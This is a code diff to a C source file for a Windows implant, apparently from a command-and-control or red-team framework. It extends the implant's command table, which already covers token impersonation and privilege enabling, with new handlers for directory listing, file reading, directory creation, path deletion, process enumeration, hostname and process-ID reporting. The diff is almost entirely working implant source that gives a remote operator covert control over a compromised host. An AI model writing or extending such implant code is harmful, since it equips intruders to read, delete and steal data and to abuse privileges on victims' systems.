@@ -1,26 +1,24 @@
 #include "command.h"
+#include <tlhelp32.h>
 
 #define UTF8_WIDE_NULL_TERMINATOR_COUNT 1U
 
-/* Maps each generated command identifier to its synchronous command handler. */
 CONST COMMAND_MAP G_CommandTable[] = {
-	{ CMD_KILLIMPLANT, CmdKillImplant },
-	{ CMD_CURRENT_TOKEN, CmdCurrentToken },
-	{ CMD_PROCESS_TOKEN, CmdProcessToken },
-	{ CMD_TOKEN_PRIVILEGES, CmdTokenPrivileges },
+	{ CMD_KILLIMPLANT,       CmdKillImplant },
+	{ CMD_CURRENT_TOKEN,     CmdCurrentToken },
+	{ CMD_PROCESS_TOKEN,     CmdProcessToken },
+	{ CMD_TOKEN_PRIVILEGES,  CmdTokenPrivileges },
 	{ CMD_IMPERSONATE_TOKEN, CmdImpersonateToken },
-	{ CMD_ENABLE_PRIVILEGE, CmdEnablePrivilege }
+	{ CMD_ENABLE_PRIVILEGE,  CmdEnablePrivilege },
+	{ CMD_LS,                CmdLs },
+	{ CMD_CAT,               CmdCat },
+	{ CMD_MKDIR,             CmdMkdir },
+	{ CMD_RM,                CmdRm },
+	{ CMD_PS,                CmdPs },
+	{ CMD_HOSTNAME,          CmdHostname },
+	{ CMD_GETPID,            CmdGetPid }
 };
 
-/**
- * @brief Converts a UTF-8 byte buffer into a heap-allocated wide string.
- *
- * @param dataLen The length of the UTF-8 input buffer in bytes.
- * @param data The UTF-8 input buffer.
- * @param wideString Receives the heap-allocated wide string on success.
- *
- * @return NO_ERROR on success, or a numeric error code on failure.
- */
 static DWORD ConvertUtf8ToWideString(
 	DWORD dataLen,
 	CONST PBYTE data,
@@ -153,9 +151,6 @@ DWORD CmdImpersonateToken(
 {
 	DWORD processId = 0;
 
-	UNREFERENCED_PARAMETER(responseData);
-	UNREFERENCED_PARAMETER(responseLen);
-
 	if (dataLen < sizeof(DWORD) || data == NULL)
 	{
 		return ERROR_INVALID_REQUEST;
@@ -174,9 +169,6 @@ DWORD CmdEnablePrivilege(
 {
 	DWORD status = NO_ERROR;
 	PWSTR privilegeName = NULL;
-
-	UNREFERENCED_PARAMETER(responseData);
-	UNREFERENCED_PARAMETER(responseLen);
 
 	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
 	if (status != NO_ERROR)
@@ -217,4 +209,307 @@ DWORD ExecuteCommandById(
 	}
 
 	return ERROR_UNKNOWN_COMMAND;
+}
+
+DWORD CmdLs(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR path = NULL;
+
+	status = ConvertUtf8ToWideString(dataLen, data, &path);
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	status = ListDirectory(path, responseData, responseLen);
+	ImplantHeapFree(path);
+	return status;
+}
+
+DWORD CmdCat(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR path = NULL;
+
+	status = ConvertUtf8ToWideString(dataLen, data, &path);
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	status = ReadFileContents(path, responseData, responseLen);
+	ImplantHeapFree(path);
+	return status;
+}
+
+DWORD CmdMkdir(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR path = NULL;
+	PBYTE buffer = NULL;
+	DWORD pathBytes = 0;
+	DWORD totalLength = 0;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	status = ConvertUtf8ToWideString(dataLen, data, &path);
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	status = CreateDirectory_(path);
+
+	pathBytes = (DWORD)(wcslen(path) + 1) * sizeof(WCHAR);
+	totalLength = sizeof(DWORD) + pathBytes;
+
+	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
+	if (buffer == NULL)
+	{
+		ImplantHeapFree(path);
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)buffer = status;
+	CopyMemory(buffer + sizeof(DWORD), path, pathBytes);
+	ImplantHeapFree(path);
+
+	*responseData = buffer;
+	*responseLen = totalLength;
+	return NO_ERROR;
+}
+
+DWORD CmdRm(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR path = NULL;
+	PBYTE buffer = NULL;
+	DWORD pathBytes = 0;
+	DWORD totalLength = 0;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	status = ConvertUtf8ToWideString(dataLen, data, &path);
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	status = DeletePath(path);
+
+	pathBytes = (DWORD)(wcslen(path) + 1) * sizeof(WCHAR);
+	totalLength = sizeof(DWORD) + pathBytes;
+
+	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
+	if (buffer == NULL)
+	{
+		ImplantHeapFree(path);
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)buffer = status;
+	CopyMemory(buffer + sizeof(DWORD), path, pathBytes);
+	ImplantHeapFree(path);
+
+	*responseData = buffer;
+	*responseLen = totalLength;
+	return NO_ERROR;
+}
+
+DWORD CmdPs(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	HANDLE snapshot = INVALID_HANDLE_VALUE;
+	PROCESSENTRY32W entry;
+	DWORD entryCount = 0;
+	DWORD bufferSize = sizeof(DWORD);
+	DWORD offset = 0;
+	PBYTE buffer = NULL;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	entry.dwSize = sizeof(PROCESSENTRY32W);
+
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE)
+	{
+		return ERROR_LIST_PROCESSES_FAILED;
+	}
+
+	if (Process32FirstW(snapshot, &entry))
+	{
+		do
+		{
+			DWORD nameBytes =
+				((DWORD)wcslen(entry.szExeFile) + 1) * sizeof(WCHAR);
+			bufferSize += sizeof(DWORD) + sizeof(DWORD) + nameBytes;
+			entryCount++;
+		}
+		while (Process32NextW(snapshot, &entry));
+	}
+
+	CloseHandle(snapshot);
+	snapshot = INVALID_HANDLE_VALUE;
+
+	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
+	if (buffer == NULL)
+	{
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)(buffer + offset) = entryCount;
+	offset += sizeof(DWORD);
+
+	entry.dwSize = sizeof(PROCESSENTRY32W);
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE)
+	{
+		ImplantHeapFree(buffer);
+		return ERROR_LIST_PROCESSES_FAILED;
+	}
+
+	if (Process32FirstW(snapshot, &entry))
+	{
+		do
+		{
+			DWORD nameBytes =
+				((DWORD)wcslen(entry.szExeFile) + 1) * sizeof(WCHAR);
+
+			if (offset + sizeof(DWORD) + sizeof(DWORD) + nameBytes > bufferSize)
+			{
+				break;
+			}
+
+			*(DWORD*)(buffer + offset) = entry.th32ProcessID;
+			offset += sizeof(DWORD);
+
+			*(DWORD*)(buffer + offset) = nameBytes;
+			offset += sizeof(DWORD);
+
+			CopyMemory(buffer + offset, entry.szExeFile, nameBytes);
+			offset += nameBytes;
+		}
+		while (Process32NextW(snapshot, &entry));
+	}
+
+	CloseHandle(snapshot);
+
+	*responseData = buffer;
+	*responseLen = offset;
+	return NO_ERROR;
+}
+
+DWORD CmdHostname(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	WCHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
+	DWORD nameLen = MAX_COMPUTERNAME_LENGTH + 1;
+	DWORD nameBytes = 0;
+	DWORD totalLength = 0;
+	PBYTE buffer = NULL;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	if (!GetComputerNameW(hostName, &nameLen))
+	{
+		return ERROR_GET_HOSTNAME_FAILED;
+	}
+
+	nameBytes = (nameLen + 1) * sizeof(WCHAR);
+	totalLength = sizeof(DWORD) + nameBytes;
+
+	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
+	if (buffer == NULL)
+	{
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)buffer = nameBytes;
+	CopyMemory(buffer + sizeof(DWORD), hostName, nameBytes);
+
+	*responseData = buffer;
+	*responseLen = totalLength;
+	return NO_ERROR;
+}
+
+DWORD CmdGetPid(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	PBYTE buffer = NULL;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	buffer = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
+	if (buffer == NULL)
+	{
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)buffer = GetCurrentProcessId();
+
+	*responseData = buffer;
+	*responseLen = sizeof(DWORD);
+	return NO_ERROR;
 }
